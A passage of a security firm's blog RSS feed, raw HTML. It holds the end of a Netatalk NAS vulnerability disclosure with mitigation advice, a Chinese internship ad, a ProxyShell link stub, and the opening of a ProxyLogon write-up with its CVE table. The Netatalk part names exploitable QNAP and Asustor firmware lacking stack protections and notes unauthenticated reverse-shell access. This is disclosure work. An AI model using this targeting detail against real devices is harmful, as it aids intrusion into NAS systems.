&lt;p&gt;In general Netatalk, PIE protection is enabled by default. It is difficult to construct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; in a known address. In fact, you can also leak libc address using a similar method. It is still exploitable.&lt;/p&gt;

&lt;p&gt;This vulnerability not only affects Synology, but also affects some devices use Netatalk.&lt;/p&gt;

&lt;h3 id=&quot;other-vendor&quot;&gt;Other vendor&lt;/h3&gt;

&lt;p&gt;We tested several vendors using Netatalk and found that most device have similar problems, some are unexploitable but some are exploitable. We have tested QNAP and Asustor here, and both have successfully obtained the shell.&lt;/p&gt;

&lt;h4 id=&quot;qnap&quot;&gt;QNAP&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on TS451
    &lt;ul&gt;
      &lt;li&gt;QTS 4.5.4.1741&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Built-in system function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/29.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20220328/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;asustor&quot;&gt;Asustor&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on AS5202T
    &lt;ul&gt;
      &lt;li&gt;ADM 3.5.7.RJR1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Built-in system function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is worth mentioning that both QNAP and Asustor NAS does not enabled stack guard, and you can get the reverse shell without brute-force.&lt;/p&gt;

&lt;p&gt;When Synology has not yet patched this vulnerability, it can be exploited as long as the default is installed. &lt;strong&gt;No authentication is required&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Although QNAP and Asustor are not enabled by default, many users who use Macs still turn it on for convenience. Actually, Netatalk will be used almost in NAS. Most NAS will have an impact, as long as they enable Netatalk, an attacker can use this vulnerability to take over most of the NAS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Your NAS is not your NAS !&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, many people open Netatalk on the external network. There are 130,000 machines on shodan alone, most of which are Synology.&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;At present, the above three have been patched, please update to the latest version.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Synology
    &lt;ul&gt;
      &lt;li&gt;https://www.synology.com/zh-hk/security/advisory/Synology_SA_20_26&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;QNAP
    &lt;ul&gt;
      &lt;li&gt;https://www.qnap.com/en/security-advisory/qsa-21-50&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Asustor
    &lt;ul&gt;
      &lt;li&gt;https://www.asustor.com/service/release_notes#ADM%203.5.7.RKU2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This vulnerability is also fixed in the recently released &lt;a href=&quot;https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html&quot;&gt;Netatalk 3.1.13&lt;/a&gt;. If you use a version before Netatalk 3.1.13, you also need to update to the latest version.&lt;/p&gt;

&lt;h3 id=&quot;disable-afp&quot;&gt;Disable AFP&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;It’s best to disable it directly. The project is rarely maintained, and the risk of continuing to use it is extremely high.&lt;/li&gt;
  &lt;li&gt;SMB is &lt;strong&gt;relatively safe&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;If you want to use similar feature, it is recommended to use SMB. It is relatively safe, but it can only be said to be relatively safe.&lt;/li&gt;
      &lt;li&gt;It is recommended that all related services should be opened in the intranet.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;We have successfully found a serious vulnerability in the NAS, and successfully wrote a proof-of-concept, which proved that it can be exploited on many NAS such as Synology, QNAP and Asustor.&lt;/p&gt;

&lt;p&gt;We also think that Netatalk is a new generation of backdoor in NAS!&lt;/p&gt;

&lt;p&gt;In the future, We hope that NAS vendor who use third-party can re-examine the security issues caused by them. It is strongly recommended that NAS vendor can review it by themselves and pay attention to whether other vendor have also fixed the vulnerabilities in the same third-party. It is possible that it will also be affected.&lt;/p&gt;

&lt;p&gt;The users who want to use NAS can also pay more attention to not opening the NAS on the external network and unused services should be disabled as much as possible to reduce the attack surface.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;In fact, we have not only found one vulnerability, we have also found that there are still many problems. In next part, we will publish more research after most vendor fix it.&lt;/p&gt;

&lt;p&gt;Please look forward to Part II.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS-en/</link>
                <guid>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS-en</guid>
                <pubDate>Mon, 28 Mar 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[已結束] DEVCORE 2022 實習生計畫</title>
                <description>&lt;p&gt;DEVCORE 自 2012 成立以來已邁向第十年，我們很重視台灣的資安，也專注找出最嚴重的弱點以保護世界。雖然公司規模擴張不快，但在漸漸站穩腳步的同時，我們仍不忘初衷：從 2020 開始在輔大、台科大成立資安獎學金；在 2021 年末擴大&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;徵才&lt;/a&gt;，想找尋有著相同理念的人才一起奮鬥；而現在，我們開始嘗試舉辦實習生計畫，希望培育人才、增強新世代的資安技能，如果您對這個計畫有興趣，歡迎來信報名！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;實習內容&quot;&gt;實習內容&lt;/h3&gt;

&lt;p&gt;本次實習分為 Binary 及 Web 兩個組別，主要內容如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
以研究為主，在與導師確定研究標的後，分析目標架構、進行逆向工程或程式碼審查。藉由這個過程訓練自己的思路，找出可能的攻擊面與潛在的弱點。另外也會讓大家嘗試寫過往漏洞的 Exploit，體驗真實世界的漏洞都是如何利用。
    &lt;ul&gt;
      &lt;li&gt;漏洞挖掘及研究 70 %&lt;/li&gt;
      &lt;li&gt;1-day 開發 (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
主要內容為在導師指引與輔佐下研究過往漏洞與近年常見新型態漏洞、攻擊手法，需要製作投影片介紹成果並建置可供他人重現弱點的模擬測試環境 (Lab)，另可能需要撰寫或修改可利用攻擊程式進行弱點驗證。
    &lt;ul&gt;
      &lt;li&gt;漏洞及攻擊手法研究 70%&lt;/li&gt;
      &lt;li&gt;建置 Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司地點&quot;&gt;公司地點&lt;/h3&gt;

&lt;p&gt;台北市松山區八德路三段 32 號 13 樓&lt;/p&gt;

&lt;h3 id=&quot;實習時間&quot;&gt;實習時間&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2022 年 4 月開始到 7 月底，共 4 個月。&lt;/li&gt;
  &lt;li&gt;每週工作兩天，工作時間為 10:00 – 18:00
    &lt;ul&gt;
      &lt;li&gt;每週固定一天下午 14:00 - 18:00 必須到公司討論進度&lt;/li&gt;
      &lt;li&gt;其餘時間皆為遠端作業&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;招募對象&quot;&gt;招募對象&lt;/h3&gt;

&lt;p&gt;大專院校大三（含）以上具有一定程度資安背景的學生&lt;/p&gt;

&lt;h3 id=&quot;預計招收名額&quot;&gt;預計招收名額&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary 組：2 人&lt;/li&gt;
  &lt;li&gt;Web 組：2~3 人&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;

&lt;p&gt;每月新台幣 16,000 元&lt;/p&gt;

&lt;h2 id=&quot;招募條件資格與流程&quot;&gt;招募條件資格與流程&lt;/h2&gt;

&lt;h3 id=&quot;實習條件要求&quot;&gt;實習條件要求&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;基本逆向工程及除錯能力
    &lt;ul&gt;
      &lt;li&gt;能看懂組合語言並瞭解基本 Debugger 使用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本漏洞利用能力
    &lt;ul&gt;
      &lt;li&gt;須知道 ROP、Heap Exploitation 等相關利用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本 Scripting Language 開發能力
    &lt;ul&gt;
      &lt;li&gt;Python、Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備分析大型 Open Source 專案能力
    &lt;ul&gt;
      &lt;li&gt;以 C/C++ 為主&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備基礎作業系統知識
    &lt;ul&gt;
      &lt;li&gt;例如知道 Virtual Address 與 Physical Address 的概念&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;知道怎樣寫的程式碼會有問題
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;…&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;加分但非必要條件
    &lt;ul&gt;
      &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
      &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
      &lt;li&gt;有公開的技術 blog/slide 或 Write-ups&lt;/li&gt;
      &lt;li&gt;精通 IDA Pro 或 Ghidra&lt;/li&gt;
      &lt;li&gt;有寫過 1-day 利用程式&lt;/li&gt;
      &lt;li&gt;具備下列經驗
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;熟悉 OWASP Web Top 10。&lt;/li&gt;
  &lt;li&gt;理解 PortSwigger Web Security Academy 中所有的安全議題或已完成所有 Lab。
    &lt;ul&gt;
      &lt;li&gt;參考連結：https://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;理解計算機網路的基本概念。&lt;/li&gt;
  &lt;li&gt;熟悉 Command Line 操作，包含 Unix-like 和 Windows 作業系統的常見或內建系統指令工具。&lt;/li&gt;
  &lt;li&gt;熟悉任一種網頁程式語言（如：PHP、ASP.NET、JSP），具備可以建立完整網頁服務的能力。&lt;/li&gt;
  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究。&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題。&lt;/li&gt;
  &lt;li&gt;具備可以建置、設定常見網頁伺服器（如：Nginx、Apache）及作業系統（如：Linux）的能力。&lt;/li&gt;
  &lt;li&gt;具備追根究柢的精神。&lt;/li&gt;
  &lt;li&gt;加分但非必要條件
    &lt;ul&gt;
      &lt;li&gt;曾經獨立挖掘過 0-day 漏洞。&lt;/li&gt;
      &lt;li&gt;曾經獨立分析過已知漏洞並能撰寫 1-day exploit。&lt;/li&gt;
      &lt;li&gt;曾經於 CTF 比賽中擔任出題者並建置過題目。&lt;/li&gt;
      &lt;li&gt;擁有 OSCP 證照或同等能力之證照。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;應徵流程&quot;&gt;應徵流程&lt;/h3&gt;

&lt;p&gt;本次甄選一共分為三個階段：&lt;/p&gt;

&lt;h4 id=&quot;第一階段書面審查&quot;&gt;第一階段：書面審查&lt;/h4&gt;

&lt;p&gt;第一階段為書面審查，會需要審查下列兩個項目&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;書面審查&lt;/li&gt;
  &lt;li&gt;簡答題測驗（2 題，詳見下方&lt;a href=&quot;/blog/2022/01/27/intern-recruit/#:~:text=簡答題題目&quot;&gt;報名方式&lt;/a&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我們會根據您的履歷及簡答題所回答的內容來決定是否有通過第一階段，我們會在七個工作天內回覆是否有通過第一階段，並且視情況附上第二階段的題目。&lt;/p&gt;

&lt;h4 id=&quot;第二階段能力測驗&quot;&gt;第二階段：能力測驗&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
    &lt;ul&gt;
      &lt;li&gt;第二階段會根據您的履歷或是任何可以證明具備 Binary Exploit 相關技能的資料來決定是否需要另外做題目，如果未達標準則會另外準備 Binary Exploitation 相關題目，原則上這個階段會給大家約兩週時間解題，解完後請務必寫下解題過程（Write-up），待我們收到解題過程後，將會根據您的狀況決定是否可以進入第三階段。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
    &lt;ul&gt;
      &lt;li&gt;無&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;第三階段面試&quot;&gt;第三階段：面試&lt;/h4&gt;
&lt;p&gt;此階段為 1~2 小時的面試，會有 2~3 位資深夥伴參與，評估您是否具備本次實習所需的技術能力與人格特質。&lt;/p&gt;

&lt;h3 id=&quot;報名方式&quot;&gt;報名方式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;請將您的&lt;strong&gt;履歷&lt;/strong&gt;及&lt;strong&gt;簡答題答案&lt;/strong&gt;做成一份 PDF 檔寄到 recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
      &lt;li&gt;請於 2022/02/11 前寄出（如果名額已滿則視情況提早結束）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;信件標題格式：[應徵] 職位 您的姓名（範例：[應徵] Web 組實習生 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在兩頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;實習經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;過去對於資安的相關研究&lt;/li&gt;
      &lt;li&gt;對於這份實習的期望&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;簡答題題目如下，請依照欲申請之組別回答，答案頁數不限，可自由發揮
    &lt;ul&gt;
      &lt;li&gt;Binary
        &lt;ul&gt;
          &lt;li&gt;假設你今天要分析一個 C/C++ 寫的 web server，在程式執行過程中，你覺得有哪些地方可能會發生問題導致程式流程被劫持？為什麼？&lt;/li&gt;
          &lt;li&gt;在 Linux 機器上，當我們在對 CGI 進行分析時，由於 CGI 是由 apache 所呼叫並傳遞 input，且在執行後會立即結束，這種程式你會如何 debug ?&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Web
        &lt;ul&gt;
          &lt;li&gt;當你在網頁瀏覽器的網址列上輸入一串網址（例如：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://site.fake.devco.re/index.php?foo=bar&lt;/code&gt;），隨後按下 Enter 鍵到出現網頁畫面為止，請問中間發生了什麼事情？請根據你所知的知識背景，以文字盡可能說明。&lt;/li&gt;
          &lt;li&gt;依據前述問題的答案，允許隨意設想任何一個情境，並以文字盡可能說明在情境的各個環節中可能發生的任何安全議題或者攻擊目標、攻擊面向。&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若有應徵相關問題，請一律使用 Email 聯繫，如造成您的不便請見諒，我們感謝您的來信，並期待您的加入！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/01/27/intern-recruit/</link>
                <guid>https://devco.re/blog/2022/01/27/intern-recruit</guid>
                <pubDate>Thu, 27 Jan 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 3 - ProxyShell!</title>
                <description>&lt;p&gt;This is a guest post DEVCORE collaborated with Zero Day Initiative (ZDI) and published at their blog, which describes the exploit chain we demonstrated at Pwn2Own 2021! Please visit the following link to read that :)&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell&quot;&gt;FROM PWN2OWN 2021: A NEW ATTACK SURFACE ON MICROSOFT EXCHANGE - PROXYSHELL!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you are interesting in more Exchange Server attacks, you can also check our series of articles:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With ProxyShell, an unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an exposed 443 port! Here is the &lt;a href=&quot;https://youtu.be/FC6iHw258RI&quot;&gt;demonstration video&lt;/a&gt;:&lt;/p&gt;

&lt;div style=&quot;text-align: center&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/FC6iHw258RI&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/</link>
                <guid>https://devco.re/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell</guid>
                <pubDate>Sun, 22 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ProxyLogon 僅僅只是冰山一角，一個針對 Microsoft Exchange Server 的全新攻擊面！</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.6em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;Microsoft Exchange Server 作為當今世界上最常見的郵件解決方案，已經幾乎是企業以及政府每日工作與維繫安全不可或缺的一部分！在今年一月，我們回報了一系列的 Exchange Server 漏洞給 Microsoft，並且將這個漏洞它命名為 &lt;a href=&quot;https://proxylogon.com/&quot;&gt;ProxyLogon&lt;/a&gt;，相信如果您有在關注業界新聞，一定也聽過這個名字！ProxyLogon 也許是 Exchange 歷史上最嚴重、影響力也最大的一個漏洞！&lt;/p&gt;

&lt;p&gt;隨著更深入的從架構層去研究 ProxyLogon，我們發現它不僅僅只是一個漏洞，而是一整個新的、沒有人提過的攻擊面可讓駭客或安全研究員去挖掘更多的漏洞。因此我們專注深入研究這個攻擊面，並從中發現了至少八個漏洞，這些漏洞涵蓋了伺服器端、客戶端，甚至密碼學漏洞，我們並將這些漏洞組合成了三個攻擊鏈：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ProxyLogon: 最知名、影響力也最大的 Exchange 攻擊鏈&lt;/li&gt;
  &lt;li&gt;ProxyOracle: 一個可以還原任意 Exchange 使用者明文密碼的攻擊鏈&lt;/li&gt;
  &lt;li&gt;ProxyShell: 我們在 Pwn2Own 2021 上展示打掉 Exchange 的攻擊鏈&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所有我們找到的漏洞都是邏輯漏洞，這代表相較於記憶體毀損類型的漏洞，這些漏洞更容易被重現以及利用，我們也將成果發表至 &lt;a href=&quot;https://www.blackhat.com/us-21/briefings/schedule/index.html#proxylogon-is-just-the-tip-of-the-iceberg-a-new-attack-surface-on-microsoft-exchange-server-23442&quot;&gt;Black Hat USA&lt;/a&gt; 及 &lt;a href=&quot;https://defcon.org/html/defcon-29/dc-29-speakers.html#tsai&quot;&gt;DEFCON&lt;/a&gt; 上，也同時獲得了 2021 Pwnie Awards 年度 Best Server-Side Bug 獎項，如果你有興趣的話可以從這邊下載會議的投影片!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! &lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf&quot;&gt;[投影片]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=5mqid-7zp8k&quot;&gt;[影片]&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本次提及的漏洞皆經過負責任的漏洞接露程序回報給微軟、並獲得修復，您可以從下面這張圖查看詳細的漏洞編號及回報時間表。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Report Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CVE&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Patch Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CAS&lt;sup&gt;[1]&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Reported By&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473&quot;&gt;CVE-2021-34473&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523&quot;&gt;CVE-2021-34523&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
